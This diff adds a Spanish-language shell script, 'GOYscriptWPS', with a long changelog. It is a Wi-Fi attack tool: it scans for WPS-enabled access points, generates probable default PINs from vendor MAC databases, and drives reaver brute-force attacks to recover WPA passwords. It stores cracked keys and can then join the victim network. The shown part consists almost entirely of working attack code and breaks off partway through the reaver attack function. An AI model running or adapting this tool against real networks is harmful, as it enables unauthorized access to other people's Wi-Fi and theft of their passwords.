@@ -1,0 +1,1499 @@
+#!/bin/sh
+# LISTA DE CAMBIOS
+# versión 1.0
+#	- versión inicial
+# versión 1.1
+#	- añadidos colores a la búsqueda de redes con wash en tiempo real (morado=contraseña ya descubierta, naranja=sesión anterior, rojo=red bloqueada)
+#	- añadidos símbolos a la red (#=red en base datos WPSPinGeneratorMOD, *=AP en base de datos de pins conocidos)
+#	- implementada la función de generación del primer pin (2 métodos: 1- base de datos de pins conocidos y 2- WPSPinGeneratorMOD)
+#	- corregidos varios bugs
+# versión 1.2
+# 	- corregido bug importante que impedía el ataque por fuerza bruta estándar
+#	- mejorada la aplicación de la base de datos de pins conocidos. Antes sólo probaba el primero. Ahora los prueba todos.
+# versión 1.3
+#	- corregido bug de guardado de sesión por defecto para evitar interferir con otros programas
+#	- mejorado fichero PINs.goy. Ahora se ordena y se borran automáticamente los duplicados.
+#	- autoalimentación del fichero PINs.goy: cuando se descubre un PIN, éste se guarda también en la base de datos de pins conocidos
+#	- antes de atacar con pins específicos se informa de cuantas MACs y PINs hay en la base de datos
+# versión 1.4
+#	- añadida la opción de conectarse a la red una vez descubierta la contraseña
+# versión 1.5
+#	- corregidos varios errores
+#	- intercambiado el orden de ejecución de WPSPinGeneratorMOD y base de datos.
+#	  El primero sólo genera un pin (salvo excepciones), por lo que me parece más lógico seguir este orden.
+#	- añadido el parámetro "-l" o "--lista" para omitir la búsqueda de redes y usar las
+#	  encontradas en la búsqueda anterior. Si no existiera búsqueda anterior, se obvia.
+#	- ahora se muestra al final la duración del proceso, al igual que en los otros scripts
+#	- reescrito el subproceso "goyscriptWPS.mostrar_log_reaver" ya que a veces se saltaba líneas.
+#	- reescrito "WPSPinGeneratorMOD". He combinado lo mejor de WPSPIN.sh y WPSPinGenerator.
+# 	  Muchas gracias a sus autores.
+#	- cambiada la carpeta de contraseñas de "wifis" a "claves" (me parece un nombre más acertado)
+#	- añadido resumen antes de proceder al ataque con reaver (como en los otros scripts)
+#	- añadido aviso del tiempo que hace que se probó el último pin con éxito (una vez superado el tiempo estipulado)
+#	- recompilado "reaver" en español y con colores e integrado en el script. En la carpeta "software".
+#	- se mejora la base de datos. Ahora se eliminan automáticamente las MACs que se conoce que usan un
+#	  algoritmo (conocido o no) para la generación del PIN.
+#	- por hacer: - en caso de red FTE-??? con ESSID cambiado, hay 3 posibles PINs. De momento sólo se prueba
+#	               uno. En un futuro haré que pruebe los 3.
+#	             - implementar el uso de reaver-wifislax cuando se detecte que el PIN no cumple la
+# 		       regla de 7 dígitos + 1 checksum
+# versión 1.6
+#	- ahora prueba todos los PINs generados por WPSPinGeneratorMOD
+#	- ahora se muestra cuantos PINs como máximo faltan por probar
+#	- reaver-wifislax recompilado e integrado en el script. También se tradujo al 100%
+#	- implementada la búsqueda de pin sin checksum con reaver-wifislax:
+#		- cuando se alcanza el 99,99% sin encontrar el pin
+#		- cuando se trata de un AP del que se sabe que no cumple la norma 7+1 checksum (base de datos)
+# versión 1.7
+#	- corregido bug "wicd"
+# versión 1.8
+#	- corregido bug "networkmanager" (por USUARIONUEVO)
+#	- corregidos problemas con chipset Ralink
+# versión 1.9
+#	- implementada compatibilidad con Backtrack (y quizá otras como Ubuntu)
+#	- modificado a 61 segundos el tiempo de espera si el AP bloquea los intentos de PIN
+#	- se mata NetworkManager antes de buscar redes (interfería con el proceso)
+# versión 2.0
+#	- corregido bug al conectarse a una red previamente desencriptada con goyscriptWPA
+#	- ahora cuando se consigue la contraseña o se cancela el proceso, aparece el menú de selección de red
+# versión 2.1
+#	- corregido bug al conectarse a una red con contraseña de 64 caracteres
+#	- actualizada la lista de MACs soportadas por WPSPinGeneratorMOD
+#	- corregido bug en Backtrack
+# versión 2.2
+#	- mejorada la compatibilidad entre distribuciones
+# versión 2.3
+#	- corregido bug al conectarse a una red. Ahora podemos desconectarnos de dicha red,
+#	  matando wpa_supplicant, el cual mantenía fijado el canal.
+#	- ahora se informa si los pines específicos son correctos o no
+# versión 2.4
+#	- corregido bug WPSPinGenerator (al obtener el pin con él se cerraba el script)
+#	- restaurado el archivo PINs.goy (estaba defectuoso)
+#	- recompilado reaver (el archivo keys.c era el original, no el modificado)
+# versión 2.7
+#	- Cambiado el sistema de numeración de la versión de los scripts para evitar confusiones
+#	  (ahora todos los scripts muestran la misma versión)
+#	- corregido bug sobre la detección de la MAC de la interfaz en algunas distribuciones
+#	- ahora si no está instalado el cliente DHCP "dhclient" se prueba con "dhcpcd"
+#	- ahora si el ESSID de WPSPinGeneratorMOD no coindice se muestra "?" en vez de "#"
+#	- añadidos colores a las indicaciones de WPSPinGeneratorMOD
+# versión 2.8
+#	- Corregido bug en Kali linux y BackTrack
+#	- Añadido parámetro "--datos" para poder pasar todos los parámetros necesarios
+#	  (imprescindible para poder funcionar con el launcher, pero se puede usar sin él)
+#	- Reemplazado el parámetro "--lista" por "-L" (más cómodo)
+# versión 2.9
+#	- Mejoras estéticas
+# versión 3.0
+#	- Ahora se comprueba al inicio si el dispositivo de almacenamiento es de
+#	  sólo lectura
+# versión 3.1
+#	- Ahora se comprueba si se tienen permisos de root para poder ejecutar el script
+#	- Ahora se desactiva el modo monitor y se inicia wicd al cerrar el script
+# versión 3.2
+#	- Corrección de errores
+# versión 3.3.1
+#	- Modificado orden de ejecución de cliente DHCP. Ahora primero dhcpcd y después
+#	  dhclient (antes era al revés)
+# versión 3.4
+#	- Añadida la MAC 8C:0C:A3 a la lista de exclusión de la base de datos de PINs conocidos
+#	- Corregido bug usando reaver en redes MOVISTAR_XXXX
+#	- Ahora se puede usar sin interfaz gráfica (con goyscriptTTY)
+#	- Añadida compatibilidad con OpenWrt
+
+
+##### CONSTANTES #####
+
+#COLORES
+negro="\033[0;30m"
+rojo="\033[0;31m"
+verde="\033[0;32m"
+marron="\033[0;33m"
+azul="\033[0;34m"
+magenta="\033[0;35m"
+cyan="\033[01;36m"
+grisC="\033[0;37m"
+gris="\033[1;30m"
+rojoC="\033[1;31m"
+verdeC="\033[1;32m"
+amarillo="\033[1;33m"
+azulC="\033[1;34m"
+magentaC="\033[1;35m"
+cyanC="\033[1;36m"
+blanco="\033[1;37m"
+subrayar="\E[4m"
+parpadeoON="\E[5m"
+parpadeoOFF="\E[0m"
+resaltar="\E[7m"
+
+#COMANDOS DE LA CARPETA "SOFTWARE"
+WRT=`ps | grep goyscriptWRT | grep -v grep`
+if [ "$WRT" = "" ] #si no se está usando goyscriptWRT
+then
+	AIRMON="./software/./airmon-ng"
+	WASH="./software/wash"
+	REAVER="./software/./reaver"
+	REAVERMOD="./software/./reaver-wifislax"
+	WPA_PSK_RAW="./software/wpa_passphraseMOD" # modificación de wpa_passphrase para que no compruebe la longitud de la contraseña (y en español ;-D)
+	PARAMETRO_PS="-A"
+	BINARY="--binary-files=text"
+else
+	AIRMON="airmon-ng"
+	WASH="wash"
+	REAVER="reaver"
+	PARAMETRO_PS=""
+	BINARY=""
+	parpadeoON=""
+	parpadeoOFF=""
+fi
+WPSPIN="./software/./WPSPinGeneratorMOD"
+FABRICANTE="software/./fabricante.sh"
+PINS="./software/PINs.goy"	# base de datos de PINs por defecto conocidos
+MACs_A_EXCLUIR="./software/MACs_excluidas.goy"	# base de datos de MACs que se deben de excluir de la base de datos de PINs conocidos
+MACs_NOCHECKSUM="./software/MACs_nochecksum.goy"	# base de datos de MACs que no cumplen la regla del checksum
+SCREEN="screen"
+
+TMP="tmp"
+WPS_TMP="wps"
+SESIONES="$WPS_TMP/sesiones"
+CLAVES="claves"
+UMBRAL_ULTIMO_PIN=5 # umbral en segundos para avisar de cuánto hace que se probó exitosamente el último pin
+VERSION=$(cat VERSION)
+VENTANA_WASH="-geometry 100x100-0+0 -bg black -fg white"
+VENTANA_REAVER="-geometry 72x100-0+0 -bg black -fg white"
+
+#CREA LAS CARPETAS NECESARIAS
+mkdir -p "$CLAVES" >/dev/null 2>&1
+mkdir -p "$SESIONES" >/dev/null 2>&1
+mkdir -p "software" >/dev/null 2>&1
+mkdir -p "$TMP" >/dev/null 2>&1
+
+
+comprobar_ayuda()
+{
+echo -e $blanco
+echo "GOYscriptWPS $VERSION by GOYfilms"
+echo -e $grisC
+echo "Modo de uso: $0 [opciones] [interfaz]"
+echo
+echo "OPCIONES:"
+echo "    -l, -L   :Usar la lista de redes detectadas la última vez"
+echo "    --datos  :Pasar como parámetros todos los datos necesarios"
+echo "              en el siguiente orden:"
+echo "              BSSID ESSID CANAL INTERFAZ"
+echo
+echo "Ejemplos: $0"
+echo "          $0 wlan1"
+echo "          $0 wlan0 -l"
+echo "          $0 -L"
+echo "          $0 --datos 01:23:45:67:89:AB mi_casa 5 wlan0"
+echo -e "$grisC"
+exit 1
+}
+
+#HORA DE INICIO
+hora_inicio()
+{
+ano1=`date +%Y`
+mes1=`date +%m`
+dia1=`date +%d`
+hora1=`date +%H`
+minutos1=`date +%M`
+segundos1=`date +%S`
+segundos_del_ano1=`date +%s`
+}
+
+#HORA DE FINALIZACIÓN
+hora_fin()
+{
+ano2=`date +%Y`
+mes2=`date +%m`
+dia2=`date +%d`
+hora2=`date +%H`
+minutos2=`date +%M`
+segundos2=`date +%S`
+segundos_del_ano2=`date +%s`
+}
+
+#DIFERENCIA DE TIEMPO ENTRE "HORA DE INICIO" Y "HORA DE FINALIZACIÓN"
+calcular_tiempo()
+{
+segundos=`expr $segundos_del_ano2 - $segundos_del_ano1`
+minutos=0
+horas=0
+dias=0
+dias=`expr $segundos / 86400`
+segundos=`expr $segundos % 86400`
+horas=`expr $segundos / 3600`
+segundos=`expr $segundos % 3600`
+minutos=`expr $segundos / 60`
+segundos=`expr $segundos % 60`
+}
+
+mostrar_duracion()
+{
+echo -e $cyanC"Duración del proceso...: "$blanco"\c"
+if [ $dias -ne 0 ]	# DESGLOSE EN DIAS, HORAS, MINUTOS Y SEGUNDOS DE LA DURACIÓN DEL PROCESO
+then
+	if [ $dias -eq 1 ]
+	then
+		echo -e "$dias día\c"
+	else
+		echo -e "$dias días\c"
+	fi
+	if [ $horas -ne 0 ] && [ $minutos -eq 0 ] && [ $segundos -eq 0 ]
+	then
+		echo -e " y \c"
+	else
+		if [ $horas -eq 0 ] && [ $minutos -ne 0 ] && [ $segundos -eq 0 ]
+		then
+			echo -e " y \c"
+		else
+			if [ $horas -eq 0 ] && [ $minutos -eq 0 ] && [ $segundos -ne 0 ]
+			then
+				echo -e " y \c"
+			else
+				if [ $horas -ne 0 ] || [ $minutos -ne 0 ] || [ $segundos -ne 0 ]
+				then
+					echo -e ", \c"
+				fi
+			fi
+		fi
+	fi
+fi
+if [ $horas -ne 0 ]
+then
+	if [ $horas -eq 1 ]
+	then
+		echo -e "$horas hora\c"
+	else
+		echo -e "$horas horas\c"
+	fi
+	if [ $minutos -ne 0 ] && [ $segundos -eq 0 ]
+	then
+		echo -e " y \c"
+	fi
+	if [ $minutos -eq 0 ] && [ $segundos -ne 0 ]
+	then
+		echo -e " y \c"
+	fi
+	if [ $minutos -ne 0 ] && [ $segundos -ne 0 ]
+	then
+		echo -e ", \c"
+	fi
+fi
+if [ $minutos -ne 0 ]
+then
+	if [ $minutos -eq 1 ]
+	then
+		echo -e "$minutos minuto\c"
+	else
+		echo -e "$minutos minutos\c"
+	fi
+	if [ $segundos -ne 0 ]
+	then
+		echo -e " y \c"
+	fi
+fi
+if [ $segundos -ne 0 ]
+then
+	if [ $segundos -eq 1 ]
+	then
+		echo -e "$segundos segundo\c"
+	else
+		echo -e "$segundos segundos\c"
+	fi
+else
+	echo -e "$segundos segundos\c"
+fi
+echo -e "$grisC"
+echo
+}
+
+#DESGLOSA HORAS, MINUTOS y SEGUNDOS UN TIEMPO DADO EN SEGUNDOS
+tiempo_ultimo_pin()
+{
+segundos=$1
+if [ $segundos -eq 0 ]
+then
+	echo -e "$segundos segundos\c"
+fi
+horas=`expr $segundos / 3600`
+segundos=`expr $segundos % 3600`
+minutos=`expr $segundos / 60`
+segundos=`expr $segundos % 60`
+if [ $horas -ne 0 ]
+then
+	printf '%d:%02d:%02d' $horas $minutos $segundos
+else
+	if [ $minutos -ne 0 ]
+	then
+		if [ $minutos -eq 1 ]
+		then
+			echo -e "$minutos minuto\c"
+		else
+			echo -e "$minutos minutos\c"
+		fi
+		if [ $segundos -ne 0 ]
+		then
+			echo -e " y \c"
+		fi
+	fi
+	if [ $segundos -ne 0 ]
+	then
+		if [ $segundos -eq 1 ]
+		then
+			echo -e "$segundos segundo\c"
+		else
+			echo -e "$segundos segundos\c"
+		fi
+	fi
+fi
+}
+
+#COMPRUEBA SI HAY INTERFACES EN MODO MONITOR Y, SI LAS HAY, LAS DESACTIVA
+desactivar_todos_monX()
+{
+INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
+let CUANTAS=`echo $INTERFACES_MONITOR | wc -w`
+let CONT=1
+while [ $CONT -le $CUANTAS ]
+do
+	MON=`echo $INTERFACES_MONITOR | awk '{print $'$CONT'}'`
+	$AIRMON stop $MON > /dev/null 2>&1
+	let CONT=$CONT+1
+done
+}
+
+#DETIENE POSIBLES PROCESOS EN MARCHA
+matar_procesos()
+{
+echo -e "$cyan""\n$1"
+echo -e "$grisC"
+PROCESOS=`ps $PARAMETRO_PS | grep -e xterm -e airodump-ng -e aircrack-ng -e aireplay-ng -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc | grep -v grep`
+while [ "$PROCESOS" != "" ]
+do
+	killall -q xterm ifconfig dhcpcd dhclient dhclient3 NetworkManager wpa_supplicant udhcpc > /dev/null 2>&1
+	PROCESOS=`ps $PARAMETRO_PS | grep -e xterm -e airodump-ng -e aircrack-ng -e aireplay-ng -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc | grep -v grep`
+done
+desactivar_todos_monX
+}
+
+#ESPERA A QUE SE PULSE UNA TECLA
+pulsar_una_tecla()
+{
+echo
+echo -e $blanco"$1"$grisC" \c"
+read -n 1 TECLA
+echo
+echo
+if [ "$1" = "Pulsa una tecla para salir..." ]
+then
+	exit 1
+fi
+}
+
+#NOMBRE Y VERSION DEL SCRIPT
+version()
+{
+if [ "$DESDE_DATOS" = "NO" ]
+then
+	clear
+fi
+SCRIPT=" GOYscriptWPS $VERSION by GOYfilms "
+N_SCRIPT=${#SCRIPT}
+N_VERSION=${#VERSION}
+let CARACTERES=$N_SCRIPT*3
+LINEA=`echo "══════════════════════════════════════════" | cut -c-${CARACTERES}`
+echo -e "$blanco\c"
+echo -e "╔${LINEA}╗"
+echo -e "║${SCRIPT}║"
+echo -e "╚${LINEA}╝"
+echo -e $grisC
+}
+
+#CALCULAMOS LA RESOLUCIÓN DE LA PANTALLA. DEPENDIENDO DE LA VERSION DE "xrandr" SE RECORTA DE UNA FORMA U OTRA
+mostrar_resolucion_de_pantalla()
+{
+which xdpyinfo > /dev/null 2>&1
+if [ $? -eq 0 ]
+then
+	RESOLUCION=`xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3`
+else
+	which xrandr > /dev/null 2>&1
+	if [ $? -eq 0 ]
+	then
+		RESOLUCION=`xrandr | grep "*" | awk '{print $1}'`
+		RESOLUCION=`echo $RESOLUCION | grep "x"`
+		if [ "$RESOLUCION" = "" ]
+		then
+			RESOLUCION=`xrandr | grep "current" | awk -F "current" '{print $2}' | awk -F " " '{print $1$2$3}' | awk -F "," '{print $1}'`
+			RESOLUCION=`echo $RESOLUCION | grep "x"`
+		fi
+		if [ "$RESOLUCION" = "" ]
+		then
+			RESOLUCION=`xrandr | grep "*" | awk '{print $2$3$4}'`
+			RESOLUCION=`echo $RESOLUCION | grep "x"`
+		fi
+	else
+		which Xvesa > /dev/null 2>&1
+		if [ $? -eq 0 ]
+		then
+			RESOLUCION=`Xvesa -listmodes 2>&1 | grep ^0x | awk '{ printf "%s %s\n",$2,$3 }' | sort -n | grep x[1-2][4-6] | tail -n 1 | awk -F 'x' '{print $1"x"$2}'` 
+		else
+			RESOLUCION=""
+		fi
+	fi
+fi
+echo -e ""$cyan"Resolución de pantalla actual: "$verdeC"$RESOLUCION"$grisC""
+echo
+case $RESOLUCION in
+	1024x600)
+		VENTANA_WASH="-geometry 90x100-0+0 -bg black -fg white"
+		VENTANA_REAVER="-geometry 58x100-0+0 -bg black -fg white";;
+	1920x1080)
+		VENTANA_WASH="-geometry 90x100-0+0 -bg black -fg white"
+		VENTANA_REAVER="-geometry 80x100-0+0 -bg black -fg white";;
+esac	
+}
+
+#SELECCION DE TARJETA WiFi
+seleccionar_tarjeta()
+{
+$AIRMON stop mon0 > /dev/null 2>&1
+TARJETAS_WIFI_DISPONIBLES=`iwconfig --version | grep "Recommend" | awk '{print $1}' | sort`
+let N_TARJETAS_WIFI=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print NF}'`
+if [ "$TARJETAS_WIFI_DISPONIBLES" = "" ]
+then
+	echo -e ""$rojoC"ERROR: No se ha detectado ninguna tarjeta WiFi"
+	echo -e "$grisC"
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	echo -e ""$cyan"Tarjetas WiFi disponibles:"$grisC""
+	echo
+	x=1
+	while [ $x -le $N_TARJETAS_WIFI ]
+	do
+		INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$x'}'`
+		DRIVER=`ls -l /sys/class/net/$INTERFAZ/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`
+		MAC=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}' | cut -c-8` #extraemos la MAC XX:XX:XX (sólo los 3 primeros pares)
+		FABRICANTE_INTERFAZ=`$FABRICANTE "$MAC"`
+		if [ $x -eq 1 ]
+		then
+			echo -e ""$cyan" Nº\tINTERFAZ\tDRIVER\t\tFABRICANTE"
+			echo -e ""$cyan" ══\t════════\t══════\t\t══════════"
+		fi
+		CARACTERES_DRIVER=`echo $DRIVER | wc -c` 
+		if [ $CARACTERES_DRIVER -gt 8 ] #CONTROLA LA TABULACION DEPENDIENDO DE LOS CARACTERES QUE TENGA LA VARIABLE "DRIVER"
+		then
+			TAB=""
+		else
+			TAB="\t"
+		fi
+		echo -e ""$amarillo" $x)\t$INTERFAZ \t\t$DRIVER\t"$TAB"$FABRICANTE_INTERFAZ"
+		x=$((x+1))
+	done
+	if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MAS DE UNA NOS PREGUNTA CUAL QUEREMOS
+	then
+		echo -e "\n"$cyan"\nSelecciona una tarjeta WiFi:\c"
+		echo -e ""$amarillo" \c"
+		read -n 1 OPCION
+		while [[ $OPCION < 1 ]] || [[ $OPCION > $N_TARJETAS_WIFI ]]
+		do
+			echo -en "\a\033[10C"$rojoC"OPCIÓN NO VÁLIDA  "$grisC""
+			sleep 1
+			echo -en ""$cyan"\rSelecciona una tarjeta WiFi: \033[K"$amarillo"\c"
+			read -n 1 OPCION
+		done
+	else
+		OPCION=1
+	fi
+fi
+if [ $N_TARJETAS_WIFI -gt 1 ] # SI DETECTA MAS DE UNA VARIA EL MENSAJE
+then
+	INTERFAZ=`echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $'$OPCION'}'`
+	echo -e "\n"
+	echo -e ""$cyan"Has seleccionado: "$verdeC"$INTERFAZ"$grisC""
+	echo
+else
+	echo
+	echo -e ""$cyan"Sólo se ha detectado una tarjeta WiFi: "$verdeC"$INTERFAZ"$grisC""
+	echo
+fi
+}
+
+
+#INICIALIZACION DE LA TARJETA
+iniciar_tarjeta()
+{
+echo -e ""$cyan"Iniciando la tarjeta WiFi..."$grisC""
+echo
+ifconfig $INTERFAZ down
+ifconfig $INTERFAZ up
+iwconfig $INTERFAZ rate 1M
+}
+
+#ACTIVA EL MODO MONITOR DE LA INTERFAZ
+activar_modo_monitor()
+{
+software/./reiniciar_interfaz.sh $INTERFAZ
+MAC_INTERFAZ=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}'` #extraemos la MAC de la interfaz del comando 'ifconfig'
+echo -e ""$cyan"Activando modo monitor en $blanco$INTERFAZ $grisC("$MAC_INTERFAZ")$cyanC..."$grisC""
+$AIRMON start $INTERFAZ $CANAL
+ifconfig mon0 > /dev/null 2>&1
+if [ $? = 0 ] #SI LA ORDEN ANTERIOR SE REALIZÓ CORRECTAMENTE, SIGNIFICA QUE EXISTE LA INTERFAZ "mon0"
+then
+	INTERFAZ_MONITOR=mon0
+else
+	INTERFAZ_MONITOR=$INTERFAZ
+fi
+}
+
+#ESCANEAR LAS REDES WPS
+buscar_redes_wps()
+{
+echo -e ""$cyan"Buscando redes WiFi con WPS activado... "$grisC""
+echo
+echo -e "$cyan$parpadeoON"
+echo -e "╔════════════════════════════════╗"
+echo -e "║                                ║"
+echo -e "║$parpadeoOFF "$cyan" PULSA CONTROL+C PARA DETENER  $parpadeoON║"
+echo -e "║$parpadeoOFF "$cyan" LA  BÚSQUEDA  Y  SELECCIONAR  $parpadeoON║"
+echo -e "║$parpadeoOFF "$cyan" UNA DE LAS REDES DETECTADAS   $parpadeoON║"
+echo -e "║                                ║"
+echo -e "╚════════════════════════════════╝"
+echo -e "$parpadeoOFF""$grisC"
+rm -rf "$WPS_TMP/redes_wps.lst" > /dev/null 2>&1 #Borra la busqueda anterior
+xterm -iconic -e $WASH -i $INTERFAZ_MONITOR -C -o "$WPS_TMP/redes_wps.lst" > /dev/null 2>&1 &
+xterm $VENTANA_WASH -title "Buscando redes WiFi con WPS activado" -e software/./goyscriptWPS.mostrar_redes_wps
+killall -q wash > /dev/null 2>&1
+}
+
+seleccionar_red_wps()
+{
+let LINEAS=`cat "$WPS_TMP/redes_wps_sin_titulo.lst" | wc -l`
+if [ $LINEAS -ne 0 ]
+then
+	clear
+	echo -e ""$cyan"\c"
+	echo "             Redes WiFi detectadas con WPS activado           "
+	echo "             ══════════════════════════════════════           "
+	echo
+	echo "  Nº          MAC         CANAL  SEÑAL  BLOQUEO  NOMBRE DE RED"
+	echo "  ══   ═════════════════  ═════  ═════  ═══════  ═════════════"
+	let LINEAS=`cat "$WPS_TMP/redes_wps_sin_titulo.lst" | wc -l`
+	let LINEA=1
+	while [ $LINEA -le $LINEAS ]
+	do
+		if [ $LINEA -le 9 ] #ALINEA A LA DERECHA EL NUMERO DE OPCION
+		then
+			ESPACIO1=" "
+		else
+			ESPACIO1=""
+		fi
+		FILA=`cat "$WPS_TMP/redes_wps_sin_titulo.lst" | sed -n ${LINEA}p`
+		MAC_AP=`echo "$FILA" | awk '{print $1}'`
+		let CANAL=`echo "$FILA" | awk '{print $2}'`
+		if [ $CANAL -le 9 ] #ALINEA A LA DERECHA EL CANAL Y CORRIGE EL NOMBRE DE RED DEPENDIENDO DE LOS CARACTERES DEL CANAL
+		then
+			ESPACIO2=" "
+		else
+			ESPACIO2=""
+		fi
+		let SENAL=`echo "$FILA" | awk '{print $3}'`
+		let SENAL=`expr $SENAL + 100` #PONE EN POSITIVO EL PORCENTAJE DE SEÑAL
+		if [ $SENAL -le 9 ] #ALINEA A LA DERECHA EL PORCENTAJE DE LA SEÑAL
+		then
+			ESPACIO3=" "
+		else
+			ESPACIO3=""
+		fi
+		BLOQUEO=`echo "$FILA" | awk '{print $5}'`
+		NOMBRE_AP=`echo "$FILA" | awk '{print substr($0,57,100)}'`
+		MAC_GUIONES=`echo $MAC_AP | sed 's/:/-/g'`
+		MAC_AP_3PARES=`echo "$MAC_AP" | cut -c-8`
+		MARCA=`"$WPSPIN" --macs 2>/dev/null | grep "$MAC_AP_3PARES"`
+		if [ "$MARCA" != "" ]
+		then
+			ESSID_WPSPIN=`echo "$MARCA" | awk '{print substr($0,13,200)}' | sed 's/?//g'`
+			ESSID_COINCIDE=`echo "$NOMBRE_AP" | grep "$ESSID_WPSPIN"`
+			if [ "$ESSID_COINCIDE" != "" ]
+			then
+				MARCA="$verdeC#"
+			else
+				MARCA="$magentaC?"
+			fi
+		else
+			MARCA=`grep "$MAC_AP_3PARES" "$PINS"`
+			if [ "$MARCA" != "" ]
+			then
+				MARCA="$amarillo*"
+			else
+				MARCA=' '
+			fi
+		fi
+
+		EXISTE_KEY=`find "$CLAVES" | grep "$NOMBRE_AP ($MAC_GUIONES).txt"`
+		EXISTE_SESION=`find "$SESIONES" | grep "$NOMBRE_AP ($MAC_GUIONES).wps"`
+		if [ ! "$EXISTE_KEY" = "" ]
+		then
+			COLOR="$magenta" #SI YA CONSEGUIMOS LA CLAVE ANTES APARECERÁ LA RED EN MAGENTA
+		else
+			if [ ! "$EXISTE_SESION" = "" ]
+			then
+				COLOR="$marron" #SI TENEMOS SESIÓN ANTERIOR GUARDADA APARECERÁ EN MARRÓN
+			else
+				COLOR="$blanco" #SI NO SE DAN LOS CASOS ANTERIORES APARECERÁ EN BLANCO
+			fi
+		fi
+		if [ "$BLOQUEO" = "No" ]
+		then
+			BLOQUEO="NO"
+		else
+			BLOQUEO="SI"
+			COLOR="$rojoC"
+		fi
+		echo -e "$COLOR $ESPACIO1$LINEA)$MARCA  $COLOR$MAC_AP   $ESPACIO2$CANAL     $ESPACIO3$SENAL%     $BLOQUEO     $NOMBRE_AP"
+		let LINEA=$LINEA+1
+	done
+
+else
+	echo -e "$rojoC"
+	echo "No se ha encontrado ninguna red WiFi con WPS activado"
+	echo -e "$grisC"
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+fi
+echo
+if [ $LINEAS -eq 1 ] #SI SÓLO SE HA DETECTADO UNA RED YA NO ES NECESARIO ESCOGER Y ATACARA ESA
+then
+	SELECCION=1
+else
+	echo -e ""$cyan"\rSelecciona una red de la lista: "$amarillo"\c"
+	read SELECCION
+fi
+while [[ $SELECCION -lt 1 ]] || [[ $SELECCION -gt $LINEAS ]]
+do
+	echo -en "\a\033[1A\033[40C"$rojoC"OPCIÓN NO VÁLIDA  "$grisC""
+	sleep 1
+	echo -en "\a\r"$cyan"Selecciona una red de la lista: \033[K"$amarillo"\c"
+	read SELECCION
+done
+FILA=`cat "$WPS_TMP/redes_wps_sin_titulo.lst" | sed -n ${SELECCION}p`
+MAC_AP=`echo "$FILA" | awk '{print $1}'`
+let CANAL=`echo "$FILA" | awk '{print $2}'`
+NOMBRE_AP=`echo "$FILA" | awk '{print substr ($0,57,100)}'`
+MAC_GUIONES=`echo $MAC_AP | sed 's/:/-/g'`
+MAC_AP_3PARES=`echo "$MAC_AP" | cut -c-8`
+}
+
+#MUESTRA LOS DATOS CON LOS QUE SE VA A TRABAJAR
+mostrar_resumen()
+{
+if [ "$FABRICANTE_INTERFAZ" = "" ]
+then
+	FABRICANTE_INTERFAZ=`$FABRICANTE "$MAC_INTERFAZ"`
+fi
+FABRICANTE_AP=`$FABRICANTE "$MAC_AP"`
+echo -e "$amarillo"
+echo -e "R E S U M E N"
+echo -e "═════════════"
+echo
+echo -e "  "$subrayar"INTERFAZ"$parpadeoOFF""$amarillo":"
+echo -e "    Nombre..........: $INTERFAZ"
+echo -e "    Modo monitor....: $INTERFAZ_MONITOR"
+echo -e "    MAC.............: $MAC_INTERFAZ"
+echo -e "    Fabricante......: $FABRICANTE_INTERFAZ"
+echo
+echo -e "  "$subrayar"PUNTO DE ACCESO"$parpadeoOFF""$amarillo":"
+echo -e "    Nombre..........: $NOMBRE_AP"
+echo -e "    MAC.............: $MAC_AP"
+echo -e "    Canal...........: $CANAL"
+echo -e "    Fabricante......: $FABRICANTE_AP"
+echo -e "$grisC"
+}
+
+#INICIA EL ATAQUE CON 'reaver'
+iniciar_reaver()
+{
+rm -rf "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).log"  > /dev/null 2>&1 #Borra el log anterior
+echo -e $cyanC"Atacando la red $blanco$NOMBRE_AP$cyanC..."
+echo
+if [ ! -e "$SESIONES/$NOMBRE_AP ($MAC_GUIONES).wps" ]  #SI NO HAY SESIÓN ANTERIOR GUARDADA PROBAMOS PRIMERO CON WPSPinGeneratorMOD
+then                                                   #Y SI HAY SESIÓN ANTERIOR, LA RESTAURAMOS Y CONTINUAMOS DESDE EL ÚLTIMO PIN GUARDADO
+	echo -e $cyanC"Iniciando ataques con pin específico..."
+	echo
+	if [ ! -e "$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ] # GENERA UN PIN CON "WPSPinGeneratorMOD"
+	then
+		PIN_WPSPIN=`$WPSPIN "$MAC_AP" "$NOMBRE_AP" 2>/dev/null`
+		let CUANTOS_PIN=`echo "$PIN_WPSPIN" | wc -l`
+		if [ $CUANTOS_PIN -gt 1 ]
+		then
+			let CONT=1
+			while [ $CONT -le $CUANTOS_PIN ]
+			do
+				PIN_A_PROBAR=`echo "$PIN_WPSPIN" | sed -n ${CONT}p`
+				echo -en $cyanC"  Probando pin $blanco$PIN_A_PROBAR$cyanC generado por WPSPinGeneratorMOD$cyanC [$CONT de $CUANTOS_PIN]... "
+				probar_un_solo_pin
+				let CONT=$CONT+1
+			done
+		else
+			PIN_A_PROBAR=$PIN_WPSPIN
+			echo -en $cyanC"  Probando pin $blanco$PIN_A_PROBAR$cyanC generado por WPSPinGeneratorMOD... "
+			probar_un_solo_pin
+		fi
+		if [ "WRT" != "" ]
+		then
+			sleep 1
+		fi
+		if [ -e "$CLAVES/$NOMBRE_AP ($MAC_GUIONES).txt" ]
+		then
+			echo -e $verdeC"PIN CORRECTO"
+			echo -e $grisC
+		else
+			echo -e $rojoC"PIN INCORRECTO"
+			echo -e $grisC
+			if [ "$INTERFAZ_GRAFICA" = "NO" ]
+			then
+				sleep 1
+			fi
+		fi
+	fi
